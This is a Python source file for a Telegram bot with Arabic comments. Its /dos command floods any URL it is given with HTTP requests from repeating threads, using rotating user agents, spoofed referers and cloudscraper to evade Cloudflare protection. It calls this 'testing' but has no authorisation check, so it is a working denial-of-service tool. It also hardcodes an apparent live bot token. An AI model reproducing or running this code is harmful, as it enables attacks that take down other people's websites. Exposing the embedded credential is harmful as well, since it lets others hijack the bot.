import threading
import time
import random
import string
from fake_useragent import UserAgent
from cloudscraper import create_scraper
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# إعدادات البوت
TOKEN = "7521359698:AAG5ttQFaDQOAbOj_CLhX0PTZlATo7BEH6Y"  # استبدل هذا بتوكن البوت الخاص بك من BotFather
ua = UserAgent()

# القوائم المستخدمة
referers = [
    "http://glz.co.il/", "https://www.idf.il/", "https://www.google.com/",
    "https://www.bing.com/", "https://www.yahoo.com/", "https://www.duckduckgo.com/",
    "https://www.reddit.com/", "https://chat.openai.com/", "https://github.com/",
    "https://www.facebook.com/", "https://www.twitter.com/", "https://www.linkedin.com/",
    "https://www.youtube.com/", "https://www.amazon.com/", "https://www.wikipedia.org/",
    "https://www.medium.com/", "https://www.stackoverflow.com/", "https://www.quora.com/",
    "https://www.pinterest.com/", "https://www.tumblr.com/", "https://www.instagram.com/",
    "https://www.netflix.com/", "https://www.microsoft.com/", "https://www.apple.com/",
    "https://www.adobe.com/", "https://www.cloudflare.com/", "https://www.digitalocean.com/",
]

paths = ["/", "/about", "/contact", "/services", "/blog", "/news", "/faq", "/products"]

base_headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
}

# تخزين العمليات الجارية
active_tests = {}

# دالة لتوليد معرف عشوائي
def generate_test_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

# دالة إرسال الطلبات
def send_requests(test_id, url, context):
    local_session = create_scraper()
    while test_id in active_tests and active_tests[test_id]["running"]:
        for _ in range(500):  # تقليل العدد لتجنب الحمل الزائد
            try:
                headers = base_headers.copy()
                headers["User-Agent"] = ua.random
                headers["Referer"] = random.choice(referers)
                full_url = url + random.choice(paths)
                local_session.get(full_url, headers=headers, timeout=5)
            except Exception:
                pass
        time.sleep(random.uniform(0.1, 0.5))

# أمر /dos
async def dos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("يرجى إرسال رابط الموقع بعد الأمر. مثال: /dos https://example.com")
        return

    url = context.args[0]
    if not url.startswith("http"):
        url = "https://" + url

    test_id = generate_test_id()
    active_tests[test_id] = {
        "url": url,
        "running": True,
        "thread": threading.Thread(target=send_requests, args=(test_id, url, context), daemon=True)
    }
    active_tests[test_id]["thread"].start()

    await update.message.reply_text(
        f"تم بدء الاختبار على الموقع {url}\nلإيقاف الاختبار، أرسل الأمر: /{test_id}"
    )

# أمر إيقاف الاختبار
async def stop_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    test_id = update.message.text[1:]  # إزالة "/"
    if test_id in active_tests:
        active_tests[test_id]["running"] = False
        del active_tests[test_id]
        await update.message.reply_text("تم إيقاف الاختبار بنجاح.")
    else:
        await update.message.reply_text("لم يتم العثور على اختبار بهذا المعرف.")

# أمر /info
async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not active_tests:
        await update.message.reply_text("لا توجد عمليات اختبار جارية حاليًا.")
        return

    response = "الاختبارات الجارية:\n"
    for test_id, info in active_tests.items():
        response += f"- الموقع: {info['url']} | أمر الإيقاف: /{test_id}\n"
    await update.message.reply_text(response)

# إعداد البوت
def main():
    application = Application.builder().token(TOKEN).build()

    # إضافة الأوامر
    application.add_handler(CommandHandler("dos", dos_command))
    application.add_handler(CommandHandler("info", info_command))
    
    # معالجة أوامر الإيقاف ديناميكيًا
    application.add_handler(CommandHandler(list(active_tests.keys()), stop_test, pass_args=True))

    # تشغيل البوت
    application.run_polling()

if __name__ == "__main__":
    main()
